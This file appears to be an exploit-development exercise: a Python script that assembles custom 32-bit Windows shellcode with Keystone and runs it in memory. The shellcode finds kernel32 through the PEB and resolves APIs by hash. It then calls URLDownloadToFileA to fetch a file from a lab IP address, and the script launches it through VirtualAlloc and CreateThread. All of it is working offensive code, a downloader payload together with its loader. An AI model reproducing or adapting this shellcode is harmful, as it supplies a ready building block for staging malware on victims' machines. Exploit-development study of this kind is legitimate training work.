import ctypes, struct
from keystone import *

CODE = (
    " start:                            " #
    #"   int3                           ;" # Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov ebp, esp                   ;" #
    "   add esp, 0xfffff9f0            ;" # // We increased ESP by 610 bytes to avoid overwriting the WSAData structure.


    " find_kernel32:                    "
    "   xor ecx, ecx                    ;" # Counter ECX = 0
    "   mov esi, FS:[ecx+30h]           ;" # ESI = &(PEB)([FS:0x30])
    "   mov esi, [esi+0Ch]              ;" # ESI = PEB -> Ldr
    "   mov esi, [esi+1Ch]              ;" # Ldr -> InInitializationOrderModuleList

    " Next_Module:                      "
    "   mov ebx, [esi+8h]              ;" # initOderModule[x].base_address
    "   mov edi, [esi+20h]             ;" # initOderModule[x].module_name 
    "   mov esi, [esi]                 ;" #  [ESI] = initOderModule[x].Next
    "   cmp [edi+12*2], cx             ;" # (UNICODE).modeule_name[12] == 0x00 ?
    "   jne Next_Module                ;" # Ldr -> InInitializationOrderModuleList

    " find_function_shorten:            "
    "   jmp find_function_shorten_bnc   ;" # short jump

    " find_function_ret:                "
    "   pop esi                         ;" # POP the return address from the stack
    "   mov [ebp+0x4], esi              ;" # Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;" # 

    " find_function_shorten_bnc:        "
    "   call find_function_ret          ;" # RELATIVE CALL with negative offset

    " find_function:                    "
    "   pushad                         ;" # Save all registers // Base address of Kernel32 is in EBP from Previous step (find_kernel32)
    "   mov eax, [ebx+0x3c]            ;" # Offset to PE Signature
    "   mov edi, [ebx+eax+0x78]        ;" # Export Table Directory RVA
    "   add edi, ebx                   ;" # Export Table Directory VMA
    "   mov ecx, [edi+0x18]            ;" # NumberOfNames Total Size
    "   mov eax, [edi+0x20]            ;" # AddressOfNames RVA
    "   add eax, ebx                   ;" # AddressOfNames VMA
    "   mov [ebp-4], eax               ;" # Save AddressOfNames VMA for later

    " find_function_loop:               "
    "   jecxz find_function_finished    ;" # Jump to the end if ECX is 0
    "   dec ecx                         ;" # Decrement our names counter
    "   mov eax, [ebp-4]                ;" # Restore AddressOfNames VMA
    "   mov esi, [eax+ecx*4]            ;" # Get the RVA of the symbol name
    "   add esi, ebx                    ;" # Set ESI to the VMA of the current symbol name

    " compute_hash:                     "
    "   xor eax, eax                    ;" # zero eax
    "   cdq                             ;" # zero edx
    "   cld                             ;" # clear direction

    " compute_hash_again:               "
    "   lodsb                           ;" # load the next byte from esi into al
    "   test al, al                     ;" # check for null terminator
    "   jz compute_hash_finished        ;" # if ZF is set, we have hit the null termninator
    "   ror edx, 0x0d                   ;" # rotate edx 13 bits to the right
    "   add edx, eax                    ;" # Add the new byte to the accumulator
    "   jmp compute_hash_again          ;" # compute_hash_again

    " compute_hash_finished:"

    " find_function_compare:               "
    "   cmp edx, [esp+0x24]             ;" # Compare computed hash with requested hash
    "   jnz find_function_loop          ;" # if it doesn't macth go back to find_function_loop
    "   mov edx, [edi+0x24]             ;" # AddressOfNameOrdinals RVA
    "   add edx, ebx                    ;" # AddressOfNameOrdinals VMA
    "   mov cx, [edx+2*ecx]             ;" # Extrapolate the function's ordinal
    "   mov edx, [edi+0x1c]             ;" # AddressOfFunctions RVA
    "   add edx, ebx                    ;" # AddressOfFunctions VMA
    "   add eax, [edx+4*ecx]            ;" # Get Functions RVA
    "   add eax, ebx                    ;" # Get Functions VMA
    "   mov [esp+0x1c], eax         ;" # Overwrite stack version of eax from pushad


    " find_function_finished:               "
    "   popad                           ;" #  Restore Registers
    "   ret                             ;" # Return

    " resolve_symbols_kernel32:          "
    "   push 0x78b5b983                 ;" # TerminateProcess hash
    "   call dword ptr [ebp+0x4]        ;" # call find_function
    "   mov [ebp+0x10], eax             ;" # Save TermineProcess Address for later usage
    "   push 0xec0e4e8e                 ;" # LoadLibraryA hash
    "   call dword ptr [ebp+0x4]        ;" # call find_function
    "   mov [ebp+0x14], eax             ;" # Save LoadLibraryA for later usage
   
    " load_Urlmon:                       "
    "   xor eax, eax                    ;"
    "   mov ax, 0x6c6c                  ;" # ll string including null terminator part of Urlmon.dll  string
    "   push eax                        ;" # ll string including null terminator part of Urlmon.dll  string
    "   push 0x642e6e6f                 ;" # on.d string part of Urlmon.dll string
    "   push 0x6d6c7255                 ;" # Urlm string part of Urlmon.dll  string
    "   push esp                        ;" # push pointer to the string required as argument for LoadLibraryA
    "   call dword ptr [ebp+0x14]         ;" # call to LoadLibraryA 


    " resolve_symbols_Urlmon:           "
    "   mov ebx, eax                   ;" # Move base address of Urlmon.dll to EBX
    "   push 0x702f1a36                 ;" # URLDownloadToFileA hash
    "   call dword ptr [ebp+0x4]        ;" # call find_function
    "   mov [ebp+0x18], eax             ;" # Save URLDownloadToFileA for later usage


    
    " create_urlstring:                " #
    "  xor eax, eax                     ;"
    "  mov ax, 0x7478                    ;"
    "  push eax                          ;"
    "  push 0x742e7473                   ;"
    "  push 0x65742f32                   ;"
    "  push 0x312e3233                   ;"
    "  push 0x312e3836                   ;"
    "  push 0x312e3239                   ;"
    "  push 0x312f2f3a                   ;"
    "  push 0x70747468                   ;" # URL: http://192.168.132.12/test.txt
    "  push esp                          ;" # Push pointer to the "http://192.168.132.12/test.txt" string
    "  pop ebx                           ;" # Store pointer to the "http://192.168.132.12/test.txt" string in EBX

    " create_dsturlfile:                " #
    "  xor eax, eax                     ;"
    "  mov eax, 0xff8b878c              ;"
    "  neg eax                          ;"
    "  push eax                          ;"
    "  push 0x2e77656e                  ;"
    "  push 0x74736574                  ;"
    "  push esp                          ;" # Push pointer to the "testnew.txt" string
    "  pop edx                           ;" # Store pointer to the "testnew.txt" string in EDX

    "call_URLDownloadToFile:               "#
    "  xor eax, eax                     ;" # NULL EAX
    "  push eax                         ;" # Push lpfnCB
    "  push eax                         ;" # Push dwReserved 
    "  push edx                         ;" # Push szFileName //  testnew.txt
    "  push ebx                         ;" # Push szURL      // "http://192.168.132.12/test.txt" 
    "  push eax                         ;" # Push pCaller
    "  call dword ptr [ebp+0x18]        ;" # Call URLDownloadToFile



    "call_terminateprocess:               "#
    "  xor eax, eax                     ;" # NULL EAX
    "  push eax                         ;" # Push dwExitCode
    "  push 0xffffffff                  ;" # Push -1 (hProcess)
    "  call dword ptr [ebp+0x10]        ;" # Call TerminateProcess


)

# Initialize engine x86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                    ctypes.c_int(len(shellcode)),
                                    ctypes.c_int(0x3000),
                                    ctypes.c_int(0x40)
)

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode))
)

print("Shellcode Location at address %s" % hex(ptr))
input("..INPUT ENTER TO EXECUTE THE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                    ctypes.c_int(0),
                                    ctypes.c_int(ptr),
                                    ctypes.c_int(0),
                                    ctypes.c_int(0),
                                    ctypes.pointer(ctypes.c_int(0))
)


ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                        ctypes.c_int(-1)
)